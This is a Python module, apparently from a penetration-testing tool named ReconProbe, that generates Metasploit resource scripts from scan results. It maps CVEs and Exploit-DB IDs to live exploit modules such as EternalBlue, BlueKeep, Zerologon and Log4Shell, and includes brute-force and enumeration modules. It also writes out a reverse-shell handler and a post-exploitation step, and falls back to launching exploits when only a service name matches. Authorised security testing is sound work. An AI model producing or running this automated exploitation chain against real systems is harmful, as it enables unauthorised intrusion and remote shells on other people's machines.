"""Metasploit resource script generator for ReconProbe.

Generates .rc resource scripts from scan results, automatically configuring
exploit and auxiliary modules with target details for use with msfconsole -r.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class MsfModule:
    """A Metasploit module entry in a generated script."""
    module_path: str
    options: dict[str, str] = field(default_factory=dict)
    description: Optional[str] = None
    run: bool = True


@dataclass
class MsfScript:
    """A complete Metasploit resource script."""
    path: str
    modules: list[MsfModule] = field(default_factory=list)
    content: str = ""
    module_count: int = 0
    auxiliary_count: int = 0
    exploit_count: int = 0

    def __post_init__(self) -> None:
        self.module_count = len(self.modules)
        self.auxiliary_count = sum(1 for m in self.modules if "auxiliary" in m.module_path)
        self.exploit_count = sum(1 for m in self.modules if "exploit" in m.module_path)


# ── Builder functions ────────────────────────────────────────────────────────


def _build_exploit_module_command(module: MsfModule, indent: int = 0) -> str:
    """Build the msfconsole commands for configuring and running an exploit module."""
    prefix = " " * indent
    lines: list[str] = []

    lines.append(f'{prefix}use {module.module_path}')
    for key, value in module.options.items():
        lines.append(f'{prefix}set {key} {value}')
    if module.description:
        lines.append(f'{prefix}# {module.description}')
    if module.run:
        lines.append(f'{prefix}run -j')
    lines.append('')  # blank line separator

    return '\n'.join(lines)


def _build_auxiliary_module_command(module: MsfModule, indent: int = 0) -> str:
    """Build commands for an auxiliary module."""
    return _build_exploit_module_command(module, indent)


def generate_port_scan_modules(
    open_ports: list[dict],
    target: str,
    lhost: str = "127.0.0.1",
) -> list[MsfModule]:
    """Generate auxiliary scanner modules based on open ports.

    Args:
        open_ports: List of dicts with keys: port, protocol, service.
        target: Target host or IP.
        lhost: Local host for LHOST setting.

    Returns:
        List of MsfModule entries configured for the target.
    """
    modules: list[MsfModule] = []
    services_seen: set[str] = set()

    for port_info in open_ports:
        port = port_info.get("port", 0)
        service = (port_info.get("service", "") or port_info.get("name", "") or "").lower()

        # SMB enumeration
        if "smb" in service or "microsoft-ds" in service or port == 445:
            key = "smb_enum"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/smb/smb_enumusers",
                    options={"RHOSTS": target},
                    description="Enumerate SMB users",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/smb/smb_enumshares",
                    options={"RHOSTS": target},
                    description="Enumerate SMB shares",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/smb/smb_version",
                    options={"RHOSTS": target},
                    description="Detect SMB version",
                ))

        # SSH enumeration
        if "ssh" in service or port == 22:
            key = "ssh_enum"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/ssh/ssh_version",
                    options={"RHOSTS": target},
                    description="Detect SSH version",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/ssh/ssh_enumusers",
                    options={"RHOSTS": target, "USER_FILE": "/usr/share/metasploit-framework/data/wordlists/common_users.txt"},
                    description="Enumerate SSH users",
                ))

        # HTTP enumeration
        if "http" in service or port in (80, 443, 8080, 8443):
            key = "http_enum"
            if key not in services_seen:
                services_seen.add(key)
                http_port = port
                ssl = "true" if port in (443, 8443) else "false"
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/http/http_version",
                    options={"RHOSTS": target, "RPORT": str(http_port), "SSL": ssl},
                    description=f"Detect HTTP version on port {http_port}",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/http/robots_txt",
                    options={"RHOSTS": target, "RPORT": str(http_port), "SSL": ssl},
                    description=f"Check robots.txt on port {http_port}",
                ))

        # MySQL enumeration
        if "mysql" in service or port == 3306:
            key = "mysql_enum"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/mysql/mysql_version",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Detect MySQL version",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/mysql/mysql_enum",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Enumerate MySQL configuration",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/mysql/mysql_schemadump",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Dump MySQL schema",
                ))

        # PostgreSQL enumeration
        if "postgres" in service or port == 5432:
            key = "postgres_enum"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/postgres/postgres_version",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Detect PostgreSQL version",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/postgres/postgres_login",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Brute-force PostgreSQL login",
                ))

        # FTP enumeration
        if "ftp" in service or port == 21:
            key = "ftp_enum"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/ftp/ftp_version",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Detect FTP version",
                ))
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/ftp/anonymous",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Check anonymous FTP access",
                ))

        # RDP enumeration
        if "rdp" in service or port == 3389:
            key = "rdp_enum"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/rdp/rdp_scanner",
                    options={"RHOSTS": target, "RPORT": str(port)},
                    description="Scan RDP configuration",
                ))

        # SMB MS17-010 check
        if "smb" in service or port in (139, 445):
            key = "ms17_010"
            if key not in services_seen:
                services_seen.add(key)
                modules.append(MsfModule(
                    module_path="auxiliary/scanner/smb/smb_ms17_010",
                    options={"RHOSTS": target},
                    description="Check MS17-010 (EternalBlue)",
                ))

    return modules


def generate_exploit_modules(
    exploit_suggestions: list,
    target: str,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> list[MsfModule]:
    """Generate exploit modules from exploit suggestions.

    Maps exploit suggestions to Metasploit modules based on service and type.

    Args:
        exploit_suggestions: List of ExploitSuggestion objects or dicts.
        target: Target host or IP.
        lhost: Local host for reverse connections.
        lport: Local port for reverse connections.

    Returns:
        List of MsfModule entries.
    """
    modules: list[MsfModule] = []
    seen_modules: set[str] = set()

    for suggestion in exploit_suggestions:
        edb_id = ""
        service = ""
        cve_id = ""
        port = None

        if hasattr(suggestion, "edb_id"):
            edb_id = getattr(suggestion, "edb_id", "")
            service = getattr(suggestion, "service", "")
            cve_id = getattr(suggestion, "cve_id", "") or ""
            port = getattr(suggestion, "port", None)
        elif isinstance(suggestion, dict):
            edb_id = suggestion.get("edb_id", "")
            service = suggestion.get("service", "")
            cve_id = suggestion.get("cve_id", "") or suggestion.get("cve", "")
            port = suggestion.get("port")

        # Map known exploits to Metasploit modules
        msf_module = _map_exploit_to_msf(edb_id, service, cve_id)
        if msf_module and msf_module.module_path not in seen_modules:
            seen_modules.add(msf_module.module_path)
            msf_module.options.setdefault("RHOSTS", target)
            if port:
                msf_module.options.setdefault("RPORT", str(port))
            # Add LHOST/LPORT if it's a reverse payload
            if any(p in msf_module.module_path for p in ["reverse", "meterpreter", "shell"]):
                msf_module.options.setdefault("LHOST", lhost)
                msf_module.options.setdefault("LPORT", str(lport))
            modules.append(msf_module)

    return modules


def _map_exploit_to_msf(edb_id: str, service: str, cve_id: str) -> Optional[MsfModule]:
    """Map an exploit suggestion to a Metasploit module path."""
    # EDB-ID to MSF module mapping
    edb_to_msf: dict[str, tuple[str, str]] = {
        "EDB-17491": ("exploit/unix/ftp/vsftpd_234_backdoor", "vsftpd 2.3.4 Backdoor"),
        "EDB-49794": ("exploit/linux/ftp/proftpd_modcopy_exec", "ProFTPD 1.3.5 mod_copy"),
        "EDB-49318": ("exploit/windows/smb/cve_2020_1472_zerologon", "Zerologon Netlogon RCE (CVE-2020-1472)"),
        "EDB-42084": ("exploit/linux/samba/is_known_pipename", "Samba is_known_pipename RCE"),
        "EDB-49707": ("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "BlueKeep RDP RCE"),
        "EDB-48245": ("exploit/windows/iis/cve_2017_7269", "IIS 6.0 WebDAV RCE"),
        "EDB-46676": ("exploit/multi/http/tomcat_jsp_upload_bypass", "Tomcat Ghostcat"),
        "EDB-49351": ("exploit/multi/http/log4shell_header_injection", "Log4Shell RCE"),
        "EDB-48105": ("exploit/multi/http/log4shell_header_injection", "Log4Shell RCE"),
        "EDB-50383": ("exploit/multi/http/apache_normalize_path_rce", "Apache 2.4.49 Path Traversal RCE"),
        "EDB-50540": ("exploit/multi/http/apache_normalize_path_rce", "Apache 2.4.50 Path Traversal RCE"),
    }

    if edb_id in edb_to_msf:
        module_path, description = edb_to_msf[edb_id]
        return MsfModule(module_path=module_path, options={}, description=description)

    # Try CVE-based mapping
    cve_to_msf: dict[str, tuple[str, str]] = {
        "CVE-2019-0708": ("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "BlueKeep RDP RCE"),
        "CVE-2017-0144": ("exploit/windows/smb/ms17_010_eternalblue", "EternalBlue SMB RCE"),
        "CVE-2017-7269": ("exploit/windows/iis/cve_2017_7269", "IIS 6.0 WebDAV RCE"),
        "CVE-2020-1472": ("exploit/windows/smb/cve_2020_1472_zerologon", "Zerologon Netlogon Privilege Escalation (CVE-2020-1472)"),
        "CVE-2021-41773": ("exploit/multi/http/apache_normalize_path_rce", "Apache HTTP Server 2.4.49 RCE"),
        "CVE-2021-42013": ("exploit/multi/http/apache_normalize_path_rce", "Apache HTTP Server 2.4.50 RCE"),
        "CVE-2021-44228": ("exploit/multi/http/log4shell_header_injection", "Log4Shell RCE"),
        "CVE-2020-1938": ("exploit/multi/http/tomcat_jsp_upload_bypass", "Tomcat Ghostcat RCE"),
        "CVE-2011-2523": ("exploit/unix/ftp/vsftpd_234_backdoor", "vsftpd 2.3.4 Backdoor"),
    }

    if cve_id in cve_to_msf:
        module_path, description = cve_to_msf[cve_id]
        return MsfModule(module_path=module_path, options={}, description=description)

    # Generic mapping by service
    service_to_msf: dict[str, tuple[str, str]] = {
        "ftp": ("exploit/unix/ftp/vsftpd_234_backdoor", "Generic FTP exploit (try vsftpd backdoor)"),
        "smb": ("exploit/windows/smb/ms17_010_eternalblue", "Generic SMB exploit (try MS17-010)"),
        "ssh": ("auxiliary/scanner/ssh/ssh_enumusers", "SSH enumeration"),
    }

    if service in service_to_msf:
        module_path, description = service_to_msf[service]
        return MsfModule(module_path=module_path, options={}, description=description)

    return None


def generate_msf_script(
    target: str,
    open_ports: list[dict],
    exploit_suggestions: list | None = None,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    include_post: bool = True,
) -> MsfScript:
    """Generate a complete Metasploit resource (.rc) script.

    Args:
        target: Target host or IP.
        open_ports: List of open port dicts with port, protocol, service.
        exploit_suggestions: Optional list of exploit suggestions to include.
        lhost: Local host for reverse connections.
        lport: Local port for reverse connections.
        include_post: Include post-exploitation modules.

    Returns:
        An MsfScript with full .rc content.
    """
    modules: list[MsfModule] = []

    # Phase 1: Set global options
    modules.append(MsfModule(
        module_path="",
        options={},
        description="Set global options",
        run=False,
    ))

    # Phase 2: Port scanning auxiliary modules
    modules.extend(generate_port_scan_modules(open_ports, target, lhost))

    # Phase 3: Exploit modules
    if exploit_suggestions:
        exploit_mods = generate_exploit_modules(exploit_suggestions, target, lhost, lport)
        if exploit_mods:
            modules.append(MsfModule(
                module_path="",
                options={},
                description="=== EXPLOIT MODULES ===",
                run=False,
            ))
            modules.extend(exploit_mods)

    # Phase 4: Post-exploitation modules
    if include_post:
        modules.append(MsfModule(
            module_path="",
            options={},
            description="=== POST-EXPLOITATION ===",
            run=False,
        ))
        modules.append(MsfModule(
            module_path="post/multi/gather/run_console_rc",
            options={"RESOURCE": "/usr/share/metasploit-framework/scripts/resource/post.rc"},
            description="Post-exploitation script stub",
            run=True,
        ))

    # Build the script content
    content_lines: list[str] = [
        "# Metasploit Resource Script",
        f"# Generated by ReconProbe for target: {target}",
        f"# LHOST: {lhost} | LPORT: {lport}",
        "#",
        "# Usage: msfconsole -r <this_file>.rc",
        "#",
        "",
    ]

    # Set global options at the start
    content_lines.append(f"setg LHOST {lhost}")
    content_lines.append(f"setg LPORT {lport}")
    content_lines.append("setg VERBOSE true")
    content_lines.append("setg THREADS 10")
    content_lines.append("")

    for module in modules:
        if not module.module_path:
            if module.description:
                content_lines.append(f"# {module.description}")
            continue

        if "auxiliary" in module.module_path:
            cmd = _build_auxiliary_module_command(module)
        else:
            cmd = _build_exploit_module_command(module)

        content_lines.append(cmd)

    # Add a handler at the end if there are exploit modules
    if exploit_suggestions:
        content_lines.append("# Start a generic handler for incoming shells")
        content_lines.append("use exploit/multi/handler")
        content_lines.append("set PAYLOAD generic/shell_reverse_tcp")
        content_lines.append(f"set LHOST {lhost}")
        content_lines.append(f"set LPORT {lport}")
        content_lines.append("set ExitOnSession false")
        content_lines.append("exploit -j -z")
        content_lines.append("")

    content_lines.append("# EOF")

    return MsfScript(
        path="",
        modules=modules,
        content='\n'.join(content_lines),
    )


def generate_msf_script_full(
    target: str,
    scan_results: dict,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> MsfScript:
    """Generate an MSF script from full scan results dict.

    Args:
        target: Target host or IP.
        scan_results: Full scan results dict containing scanner, enrichment data, etc.
        lhost: Local host for reverse connections.
        lport: Local port for reverse connections.

    Returns:
        An MsfScript ready for export.
    """
    # Extract open ports from scan results
    open_ports: list[dict] = []
    scanner_data = scan_results.get("scanner_data") or {}
    for host, ports_data in scanner_data.items():
        if isinstance(ports_data, dict):
            for port_info in ports_data.get("ports", []):
                if isinstance(port_info, dict):
                    open_ports.append({
                        "port": port_info.get("port"),
                        "protocol": port_info.get("protocol", "tcp"),
                        "service": port_info.get("service", "") or port_info.get("name", ""),
                        "version": port_info.get("version"),
                    })
                elif hasattr(port_info, "port"):
                    open_ports.append({
                        "port": getattr(port_info, "port", 0),
                        "protocol": getattr(port_info, "protocol", "tcp"),
                        "service": getattr(port_info, "service", "") or getattr(port_info, "name", ""),
                        "version": getattr(port_info, "version", None),
                    })

    # Extract exploit suggestions
    exploit_suggestions: list = []
    exploit_data = scan_results.get("exploit_data") or scan_results.get("exploit_suggest_data")
    if exploit_data:
        if isinstance(exploit_data, dict):
            exploit_suggestions = exploit_data.get("suggestions", []) or exploit_data.get("results", [])
        elif hasattr(exploit_data, "suggestions"):
            exploit_suggestions = getattr(exploit_data, "suggestions", [])

    return generate_msf_script(
        target=target,
        open_ports=open_ports,
        exploit_suggestions=exploit_suggestions,
        lhost=lhost,
        lport=lport,
    )
